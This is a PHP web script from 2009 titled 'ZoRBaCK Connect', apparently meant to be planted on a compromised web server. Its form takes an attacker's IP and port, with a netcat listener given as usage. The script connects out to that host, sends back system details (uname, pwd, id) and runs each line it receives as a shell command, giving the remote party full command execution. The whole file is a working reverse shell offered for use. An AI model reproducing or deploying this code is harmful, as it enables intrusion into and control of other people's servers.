<?

/*

coded by ZoRLu

03.11.2009

admin@yildirimordulari.com ( only msn )

z0rlu.blogspot.com

*/

print ( '<title>ZoRBaCK Connect</title>' );

echo "<br><b>ZoRBaCK Connect<br> 
            Usage: nc -vv -l -p 21<br>
            <hr> 
            <form method='POST' action=''><br> 
            Your IP & Port:<br> 
            <input type='text' name='ipim' size='15' value=''>
            <input type='text' name='portum' size='5' value='21'><br><br> 
            <input type='submit' value='Connect'><br><br>
            <hr>
            </form>"; 
            
         $ipim=$_POST['ipim']; 
         $portum=$_POST['portum']; 
         if ($ipim <> "") 
         { 
         $mucx=fsockopen($ipim , $portum , $errno, $errstr ); 
         if (!$mucx){ 
               $result = "Error: didnt connect !!!"; 
         } 
         else { 
         
         $zamazing0="\n";
                  
         fputs ($mucx ,"\nwelcome ZoRBaCK\n\n");
         fputs($mucx , system("uname -a") .$zamazing0 );
         fputs($mucx , system("pwd") .$zamazing0 );
         fputs($mucx , system("id") .$zamazing0.$zamazing0 );
         while(!feof($mucx)){  
       fputs ($mucx); 
       $one="[$";
       $two="]";
       $result= fgets ($mucx, 8192); 
      $message=`$result`; 
       fputs ($mucx, $one. system("whoami") .$two. " " .$message."\n"); 
      } 
      fclose ($mucx); 
         } 
         } 

?>